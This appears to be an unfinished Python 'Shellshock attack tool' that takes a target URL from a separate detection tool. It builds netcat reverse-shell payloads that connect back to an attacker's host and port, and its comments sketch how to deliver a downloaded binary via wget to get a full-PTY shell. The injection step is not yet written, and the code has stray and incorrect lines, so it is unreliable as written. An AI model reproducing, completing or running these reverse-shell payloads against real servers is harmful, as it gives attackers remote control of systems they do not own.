import sys
import requests

''' Paste in the URL from the shellshock_dect tool '''
def shellshock_rev_payloads(lhost, lport, target_url):
    ''' WE DON'T NEED TO CRAFT ANYMORE URLs!!! Because, we already have the one we're looking for; we just need to work with it '''
    ''' This is just a text value, no network ops happening '''
    reverse_payloads = []
    ''' Old netcat '''
    reverse_payload_1 = 'nc -e /bin/sh {} {}'.format(lhost, lport)
    ''' Make our reverse shell a binary. Deliver it to target via wget. Wget would be achieved by command execution.
    Host a python server externally, the server downloads your payload. You then issue a reverse shell using netcat
    but instead of -e /bin/sh, you do -e /dev/shm/revpy <- Alias for payload. That's how we'd deliver it. Then catch it on our side
    with full PTY support unlike /bin/sh and other capabilities if we want'''
    ''' New netcat '''
    reverse_payload_2 = "rm /tmp/f;mkfifo  /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {} {}".format(lhost, lport)
    reverse_payloads.append(reverse_payload_1)
    reverse_payloads.append(reverse_payload_2)
    word_response = requests.get(target_url).status_code
    return reverse_payloads

def main():
    lhost = sys.argv[1]
    lport = sys.argv[2]
    ''' We get this URL from the shellshock_dect tool '''
    target_url = sys.argv[3]
    print("Shellshock attack tool")

    ''' Just a GET request ATM. Needs to have a socket attached ''' 
    result = shellshock_rev_payloads(lhost, lport, target_url)
    for rev_payload in result:
        ''' 
        The payloads should cycle from 1 - ... here until one payload connects back to us 
        Create sockets back to us which contain the payloads
        '''

        ''' 
        Get all the rev shells to send in a get request
        '''

        print("Reverse shell payload(s): {}".format(rev_payload))
        '''
        rev_sock.connect(lhost, lport) - This will create a socket and then send the payload to target and then we get shell (Reverse shell payload)
        '''
main()
